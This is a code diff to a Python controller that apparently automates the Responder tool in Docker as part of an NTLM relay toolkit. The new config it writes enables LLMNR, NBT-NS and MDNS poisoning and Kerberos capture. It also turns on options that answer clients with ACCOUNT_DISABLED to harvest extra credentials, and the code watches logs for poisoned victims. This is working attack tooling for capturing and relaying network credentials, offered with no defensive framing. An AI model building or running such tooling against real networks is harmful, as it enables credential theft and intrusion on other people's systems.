@@ -6,7 +6,6 @@ import time
 from pathlib import Path
 from typing import Optional
 
-import docker
 from docker.models.containers import Container
 
 from btc_module_relay_nxc_impckt_rspndr.config import AppConfig
@@ -50,7 +49,7 @@ class ResponderController:
 
         # Generate Responder.conf with SMB/HTTP disabled to avoid
         # port conflicts with ntlmrelayx listener
-        self._generate_config()
+        conf_path = self._generate_config()
 
         volumes = self._build_volumes()
         cmd = self._build_command()
@@ -64,6 +63,9 @@ class ResponderController:
             volumes=volumes,
         )
         logger.info(f"Responder started: {self._container.short_id}")
+
+        # Copy generated config into the running container
+        self._copy_config(conf_path)
 
         self._stop_event.clear()
         self._log_thread = threading.Thread(target=self._tail_logs, daemon=True)
@@ -86,64 +88,107 @@ class ResponderController:
         except Exception:
             return False
 
-    def _generate_config(self) -> None:
+    def _generate_config(self) -> Path:
         """Generate Responder.conf disabling SMB/HTTP to let ntlmrelayx own those ports."""
         conf_dir = Path(self.cfg.docker.responder_config_dir)
         conf_dir.mkdir(parents=True, exist_ok=True)
         conf_path = conf_dir / "Responder.conf"
 
         config_body = f"""[Responder Core]
-SQLLite = Responder.db
-SessionLog = Responder-Session.log
-PoisonersLog = Poisoners-Session.log
-AnalyzeLog = Analyzer-Session.log
-Decode_FullDomain = On
-HTMLToServe = files/AccessDenied.html
+; Poisoners to start
+MDNS  = On
+LLMNR = On
+NBTNS = On
 
-[HTTPS Server]
-HTTPS = Off
+; IPv6 conf:
+DHCPv6 = Off
+
+; Servers to start
+SQL      = Off
+SMB      = Off
+QUIC     = Off
+RDP      = Off
+Kerberos = Off
+FTP      = Off
+POP      = Off
+SMTP     = Off
+IMAP     = Off
+HTTP     = Off
+HTTPS    = Off
+DNS      = {'On' if self.cfg.responder.dns else 'Off'}
+LDAP     = Off
+DCERPC   = Off
+WINRM    = Off
+SNMP     = Off
+MQTT     = Off
+MYSQL    = Off
+MSSQL    = Off
+
+; Custom challenge.
+Challenge = Random
+
+; SQLite Database file
+Database = Responder.db
+
+; Default log file
+SessionLog = Responder-Session.log
+
+; Poisoners log
+PoisonersLog = Poisoners-Session.log
+
+; Analyze mode log
+AnalyzeLog = Analyzer-Session.log
+
+; Dump Responder Config log:
+ResponderConfigDump = Config-Responder.log
+
+; Specific IP Addresses to respond to (default = All)
+RespondTo =
+
+; Specific NBT-NS/LLMNR names to respond to (default = All)
+RespondToName =
+
+; Specific IP Addresses not to respond to (default = None)
+DontRespondTo =
+
+; Specific NBT-NS/LLMNR names not to respond to (default = None)
+DontRespondToName = ISATAP
+
+; MDNS TLD not to respond to (default = _dosvc). Do not add the ".", only the TLD.
+DontRespondToTLD = _dosvc
+
+; If set to On, we will stop answering further requests from a host
+; if a hash has been previously captured for this host.
+AutoIgnoreAfterSuccess = Off
+
+; If set to On, we will send ACCOUNT_DISABLED when the client tries
+; to authenticate for the first time to try to get different credentials.
+CaptureMultipleCredentials = On
+
+; If set to On, we will send NTLM auth to all requests.
+CaptureMultipleHashFromSameHost = On
+
+[DHCPv6 Server]
+DHCPv6_Domain =
+SendRA = Off
+BindToIPv6 =
+
+[Kerberos]
+KerberosMode = CAPTURE
 
 [HTTP Server]
-HTTP = Off
+Serve-Always = Off
+Serve-Exe = Off
+Serve-Html = Off
+HtmlFilename = files/AccessDenied.html
+ExeFilename =
+ExeDownloadName = ProxyClient.exe
+WPADScript =
+HTMLToInject =
 
-[SMB Server]
-SMB = Off
-
-[RDP Server]
-RDP = Off
-
-[SQL Server]
-SQL = Off
-
-[FTP Server]
-FTP = Off
-
-[IMAP Server]
-IMAP = Off
-
-[POP3 Server]
-POP3 = Off
-
-[SMTP Server]
-SMTP = Off
-
-[DNS Server]
-DNS = {'On' if self.cfg.responder.dns else 'Off'}
-
-[LDAP Server]
-LDAP = Off
-
-[DCERPC Server]
-DCERPC = Off
-
-[WinRM Server]
-WinRM = Off
-
-[SNMP Server]
-SNMP = Off
-
-[MSSQL Server]
-MSSQL = Off
+[HTTPS Server]
+SSLCert = certs/responder.crt
+SSLKey = certs/responder.key
 
 [HTTP-Auth]
 HTTP-Basic = Off
@@ -153,15 +198,28 @@ WPAD = {'On' if self.cfg.responder.wpad else 'Off'}
 """
         conf_path.write_text(config_body, encoding="utf-8")
         logger.info(f"Generated Responder.conf at {conf_path}")
+        return conf_path
+
+    def _copy_config(self, conf_path: Path) -> None:
+        """Copy generated config into running container via docker-py put_archive."""
+        import tarfile
+        import io
+
+        if not self._container:
+            return
+
+        tarstream = io.BytesIO()
+        with tarfile.open(fileobj=tarstream, mode="w") as tar:
+            tar.add(str(conf_path), arcname="Responder.conf")
+        tarstream.seek(0)
+        self._container.put_archive("/opt/responder", tarstream)
+        logger.info("Copied Responder.conf into container")
 
     def _build_volumes(self) -> dict:
-        logs = str(Path(self.cfg.docker.logs_dir).resolve())
-        resp_conf = str(Path(self.cfg.docker.responder_config_dir).resolve())
-        Path(logs).mkdir(parents=True, exist_ok=True)
-        Path(resp_conf).mkdir(parents=True, exist_ok=True)
+        logs = Path(self.cfg.docker.logs_dir)
+        logs.mkdir(parents=True, exist_ok=True)
         return {
-            logs: {"bind": "/opt/responder/logs", "mode": "rw"},
-            resp_conf: {"bind": "/opt/responder", "mode": "rw"},
+            str(logs.resolve()): {"bind": "/opt/responder/logs", "mode": "rw"},
         }
 
     def _build_command(self) -> list[str]:
@@ -200,7 +258,6 @@ WPAD = {'On' if self.cfg.responder.wpad else 'Off'}
             logger.info(f"[Responder] {line}")
             jsonl_event("responder_log", line=line)
             if "poisoned" in line.lower():
-                # Try to extract victim IP and requested name
                 self._handle_poison_event(line)
         else:
             logger.debug(f"[Responder] {line}")
